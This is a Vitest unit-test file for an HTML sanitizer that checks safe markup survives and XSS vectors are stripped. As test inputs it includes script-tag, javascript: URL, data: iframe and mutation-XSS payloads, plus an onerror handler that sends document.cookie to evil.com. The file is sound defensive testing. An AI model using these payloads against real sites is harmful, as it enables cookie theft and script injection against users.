import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from '../utils/html';

// ─── Tests ──────────────────────────────────────────────────────

describe('sanitizeHtml', () => {
    // ── Null / empty handling ─────────────────────────────────────
    it('returns null for null input', () => {
        expect(sanitizeHtml(null)).toBeNull();
    });

    it('returns null for undefined input', () => {
        expect(sanitizeHtml(undefined)).toBeNull();
    });

    it('returns null for empty string', () => {
        expect(sanitizeHtml('')).toBeNull();
    });

    // ── Safe content passes through ───────────────────────────────
    it('preserves plain text', () => {
        expect(sanitizeHtml('Hello, world!')).toBe('Hello, world!');
    });

    it('preserves safe inline HTML', () => {
        const input = '<p>This is <strong>bold</strong> and <em>italic</em>.</p>';
        const result = sanitizeHtml(input);
        expect(result).toContain('<strong>bold</strong>');
        expect(result).toContain('<em>italic</em>');
    });

    it('preserves safe links', () => {
        const input = '<a href="https://example.com">Visit</a>';
        const result = sanitizeHtml(input);
        expect(result).toContain('href="https://example.com"');
        expect(result).toContain('Visit');
    });

    // ── Script injection ──────────────────────────────────────────
    it('strips <script> tags', () => {
        const result = sanitizeHtml('<script>alert("xss")</script><p>safe</p>');
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('alert');
        expect(result).toContain('safe');
    });

    it('strips script tags with attributes', () => {
        const result = sanitizeHtml('<script src="evil.js" type="text/javascript"></script>');
        expect(result).not.toContain('<script');
    });

    // ── Event handler injection ───────────────────────────────────
    it('strips onclick handlers', () => {
        const result = sanitizeHtml('<img src="x.jpg" onclick="alert(1)">');
        expect(result).not.toContain('onclick');
    });

    it('strips onerror handlers', () => {
        const result = sanitizeHtml('<img src="x" onerror="fetch(\'https://evil.com/\'+document.cookie)">');
        expect(result).not.toContain('onerror');
    });

    it('strips onmouseover handlers', () => {
        const result = sanitizeHtml('<a href="#" onmouseover="stealData()">hover me</a>');
        expect(result).not.toContain('onmouseover');
    });

    // ── Protocol injection ────────────────────────────────────────
    it('strips javascript: href', () => {
        const result = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
        expect(result).not.toContain('javascript:');
    });

    it('strips data:text/html src', () => {
        const result = sanitizeHtml('<iframe src="data:text/html,<script>alert(1)</script>"></iframe>');
        expect(result).not.toContain('data:text/html');
    });

    // ── Forbidden tags ────────────────────────────────────────────
    it('strips <iframe>', () => {
        const result = sanitizeHtml('<iframe src="https://evil.com"></iframe>');
        expect(result).not.toContain('<iframe');
    });

    it('strips <object>', () => {
        const result = sanitizeHtml('<object data="file.swf"></object>');
        expect(result).not.toContain('<object');
    });

    it('strips <style> tags', () => {
        const result = sanitizeHtml('<style>body { display: none; }</style><p>visible</p>');
        expect(result).not.toContain('<style');
        expect(result).toContain('visible');
    });

    // ── Mutation XSS patterns ─────────────────────────────────────
    it('strips executable script from null-byte injected tag', () => {
        // DOMPurify removes the script context; any residual text is safe plain text
        const result = sanitizeHtml('<scr\0ipt>alert(1)</scr\0ipt>');
        // Must not produce a runnable <script> element
        expect(result).not.toMatch(/<script/i);
    });

    it('handles nested script tag attempts', () => {
        // After parsing: inner <script> is stripped; leftover text is HTML-encoded and harmless
        const result = sanitizeHtml('<sc<script>ript>alert(1)</sc</script>ript>');
        expect(result).not.toMatch(/<script/i);
        // Any remaining "alert(1)" is plain text with encoded brackets — not executable
        if (result && result.includes('alert(1)')) {
            expect(result).toContain('&gt;');
        }
    });
});
